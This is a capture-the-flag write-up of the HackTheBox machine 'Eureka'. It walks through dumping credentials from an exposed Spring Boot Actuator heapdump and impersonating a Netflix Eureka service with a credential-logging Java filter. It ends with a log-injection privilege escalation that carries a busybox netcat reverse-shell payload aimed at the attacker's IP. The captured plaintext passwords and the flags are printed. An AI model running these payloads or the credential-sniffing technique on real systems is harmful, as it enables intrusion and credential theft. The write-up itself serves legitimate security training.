```json
Alias: Eureka
Date: 02-05_2025
Platform: Hackthebox
OS: Linux
Difficulty: Hard
Status: Complete
IP: 10.10.11.66
```

# Eureka
# Summary

Open Spring Boot Actuator endpoint leads to a heapdump from where we can retrieve credentials, we can then leverage Netflix Eureka to sniff some credentials and take advantage of a script running as root periodically
 
---

# Information Gathering
## NMAP
```
# Nmap 7.95 scan initiated Fri May  2 14:52:11 2025 as: nmap -sC -sV -oA nmap -Pn 10.10.11.66
Nmap scan report for 10.10.11.66
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)
|   256 90:11:9d:67:b6:f6:64:d4:df:7f:ed:4a:90:2e:6d:7b (ECDSA)
|_  256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://furni.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May  2 14:52:56 2025 -- 1 IP address (1 host up) scanned in 44.21 seconds
```
## Discovered Subdomains
```
furni.htb
```

---
# Enumeration

Spring Boot Actuator is exposed on http://furni.htb/actuator. We can then acquire a heapdump from http://furni.htb/actuator/heapdump. Next run

```bash
strings heapdump | grep 'password='
```

If your wondering how we find out about actuator my process was:

1. Find 404 Error message
2. Copy paste to google
3. Find out it's relate to Spring Boot
4. Look for Spring Boot related vulnerabilities
5. Find out about Actuator

| Username | Password             |
| -------- | -------------------- |
| oscar190 | 0sc@r190_S0l!dP@sswd |



---

# Exploitation

We can then SSH to the box as `oscar190`

`/var/www/web/user-management-service/src/main/resources` Contains the password for port 8761 which is running a eureka instance

| Username   | Password          |
| ---------- | ----------------- |
| EurekaSrvr | 0scarPWDisTheB3st |



---

# Lateral Movement

The panel we can see is the dashboard for Netflix Eureka. This is a service that helps manage other services mostly used in micro-controller environments. Here's how it works:

1. You start the eureka server and it's listening on http://localhost:8761
2. You connect Service A to the eureka server
3. You connect Service B to the eureka server

Now, service B doesn't need to remember the IP of service A, it can instead just ask the eureka server, This makes it possible to not hard-code IPs and simplify everything. For the next attack, reading https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka will help.

In the eureka panel, we can see that three services are running:

![[Pasted image 20250502212929.png]]

The first component is the Spring Cloud Gateway. Its job is to route incoming requests to the appropriate microservice and act as a load balancer when multiple instances of the same service are registered.

Next is the WebService that is running at http://furni.htb/, after which we have USER-MANAGEMENT-SERVICE, Furni uses this to manage requests regarding registration, authentication, etc.

Here's what we intend to do:

1. Create a new service with same name as `USER-MANAGEMENT-SERVICE`
2. Register it to the eureka server
3. Wait until someone tries to log in and hope that the Gateway sends the request to our service instead of the original `USER-MANAGEMENT-SERVICE`

Simple enough but configuration was a pain.

1. Start by navigating to https://start.spring.io/
2. Select maven
3. Select Java
4. Set artifact name to `Furni`
5. Add Dependencies:
	1. Eureka Discovery Client
	2. Spring Web
6. Download file
7. Unzip and navigate to `Furni/src/main/resources`
8. Open `application.properties` and add this:

```properties
spring.application.name=USER-MANAGEMENT-SERVICE
spring.session.store-type=jdbc
spring.cloud.inetutils.preferredNetworks=10.10.14.*
spring.cloud.inetutils.ignoredInterfaces=wlp2s0,enp0s.*
spring.cloud.client.hostname=10.10.14.74
#Eureka
eureka.client.service-url.defaultZone= http://EurekaSrvr:0scarPWDisTheB3st@10.10.11.66:8761/eureka/
eureka.instance.hostname=10.10.14.74
eureka.instance.prefer-ip-address=true
eureka.instance.instance-id=ImEvilHeHe
#tomcat
server.address=10.10.14.74
server.port=8081
# Enable proxy support
server.forward-headers-strategy=native
# Log
logging.level.root=INFO
logging.file.name=log/application.log
logging.file.path=./
```

9. Make sure to replace `10.10.14.74` with your IP
10. change `spring.cloud.inetutils.preferredNetworks=10.10.14.*` to what your `tun0` might be
11. in `ignoredInterfaces` ignore other interfaces that you might have which may be selected instead of your `tun0`.
12. Navigate to `Furni/src/main/java/com/example/Furni`
13. Create a file named `RequestLoggingFilter.java` With the following contents:

```java
package com.example.Furni;

import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.ReadListener;
import jakarta.servlet.ServletInputStream;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletRequestWrapper;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.stereotype.Component;
import org.springframework.web.filter.OncePerRequestFilter;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Collections;
import java.util.Enumeration;
import java.util.stream.Collectors;

@Component
public class RequestLoggingFilter extends OncePerRequestFilter {

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain filterChain) throws ServletException, IOException {

        CachedBodyHttpServletRequest wrappedRequest = new CachedBodyHttpServletRequest(request);

        String method = wrappedRequest.getMethod();
        String uri = wrappedRequest.getRequestURI();
        String query = wrappedRequest.getQueryString();

        System.out.println("📥 Incoming Request: " + method + " " + uri + (query != null ? "?" + query : ""));

        // Log headers
        System.out.println("🔤 Headers:");
        Enumeration<String> headerNames = wrappedRequest.getHeaderNames();
        while (headerNames.hasMoreElements()) {
            String name = headerNames.nextElement();
            String value = Collections.list(wrappedRequest.getHeaders(name)).stream().collect(Collectors.joining(", "));
            System.out.println(name + ": " + value);
        }


        String body = wrappedRequest.getReader().lines().collect(Collectors.joining(System.lineSeparator()));
        System.out.println("📦 Body:\n" + body);

        filterChain.doFilter(wrappedRequest, response);
    }

    // Wrapper to cache the request body
    private static class CachedBodyHttpServletRequest extends HttpServletRequestWrapper {
        private final byte[] cachedBody;

        public CachedBodyHttpServletRequest(HttpServletRequest request) throws IOException {
            super(request);
            cachedBody = request.getInputStream().readAllBytes();
        }

        @Override
        public ServletInputStream getInputStream() {
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(cachedBody);
            return new ServletInputStream() {
                @Override
                public int read() {
                    return byteArrayInputStream.read();
                }

                @Override
                public boolean isFinished() {
                    return byteArrayInputStream.available() == 0;
                }

                @Override
                public boolean isReady() {
                    return true;
                }

                @Override
                public void setReadListener(ReadListener listener) {
                    // no-op
                }
            };
        }

        @Override
        public BufferedReader getReader() {
            return new BufferedReader(new InputStreamReader(getInputStream()));
        }
    }
}
```

14. Go back to `Furni` and start the service with `./mvnw spring-boot:run`
15. If everything went well you should get a request with credentials for `miranda-wise` in a few minutes


| Username     | Password           |
| ------------ | ------------------ |
| miranda-wise | IL!veT0Be&BeT0L0ve |

---

# Privilege Escalation


With `pspy`, we can see that the script `/opt/log_analyse.sh` is being run by root periodically on the file `/var/www/web/user-management-service/log/application.log` which we have write access to, we can take advantage of this by

```bash
echo 'HTTP Status: x[$(busybox nc 10.10.14.74 4444 -e sh)]' > /var/www/web/user-management-service/log/application.log
```

Make sure to start up a listener first.

The problem here lies in line 57 of the code which evaluates `x[]` as some kind of array and tries to evaluate the inner part of the brackets where we can run code, here is a simple example:

```bash
#!/bin/bash

code='x[$(uname -a)]'

if [[ "asds" -eq "$code" ]]; then
    echo $code
fi
```

And we should get the root flag!

---

# Flags
- f074812d8c64ad145a530a9c5347cffb
- ce30d2ffb5ed7f06fa8d1ef7e82cd5c1

#CTF